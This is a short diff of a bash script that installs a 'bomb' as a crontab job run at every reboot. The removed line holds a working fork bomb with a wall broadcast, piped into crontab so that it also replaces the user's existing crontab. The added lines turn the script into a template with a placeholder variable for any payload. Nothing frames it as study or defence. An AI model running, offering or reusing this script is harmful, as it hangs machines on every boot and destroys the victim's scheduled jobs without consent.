@@ -1,2 +1,3 @@
 #!/usr/bin/env bash
-echo '@reboot :(){echo "balls"|wall;:|:&disown};:&disown'|crontab
+bomb= # this will be your bomb you want in the crontab
+echo "@reboot $bomb"|crontab
